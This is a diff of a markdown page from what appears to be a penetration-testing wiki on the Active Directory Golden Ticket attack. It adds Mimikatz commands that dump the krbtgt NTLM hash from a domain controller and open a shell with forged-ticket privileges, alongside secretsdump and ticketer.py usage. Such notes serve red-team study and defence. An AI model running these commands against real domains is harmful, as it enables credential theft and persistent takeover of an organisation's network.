@@ -55,7 +55,7 @@ We can use Pass-the-Hash, crack password hash or find plain-text password.
 [kerberoasting.md](../ad-post-compromise-attacks/kerberoasting.md)
 {% endcontent-ref %}
 
-
+Or other ways...
 
 ## Get krbtgt's NTLM hash
 
@@ -64,7 +64,9 @@ The second task is obtain the NTLM hash of the krbtgt account. These are the met
 ### LSASS
 
 ```powershell
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computer $DC_NANE.local
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computer $DC_NAME
+
+Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"' -Computer $DC_NAME
 ```
 
 <figure><img src="../../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>
@@ -114,6 +116,14 @@ ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -
 
 ## Use Golden Ticket
 
+### mimikatz
+
+Once we have created the Golden Ticket with mimikatz in the current session, we have to open a new cmd to the current privileges.
+
+```powershell
+mimikatz > misc::cmd # this open cmd promt with current privileges
+```
+
 ### secretsdump.py
 
 {% code overflow="wrap" %}
@@ -126,7 +136,7 @@ KRB5CCNAME="NAME.ccache" secretsdump -no-pass -k -dc-ip $DC_IP $DOMAIN.local/$NA
 
 
 
-## GolenCopy
+## GoldenCopy
 
 You encounter limitations with your golden tickets (DACLs, detection)? GoldenCopy retrieves all the information (ID, groups, etc) of a specific user in a neo4j database (bloodhound) and prepares the mimikatz/ticketer command to impersonate his permissions.
 
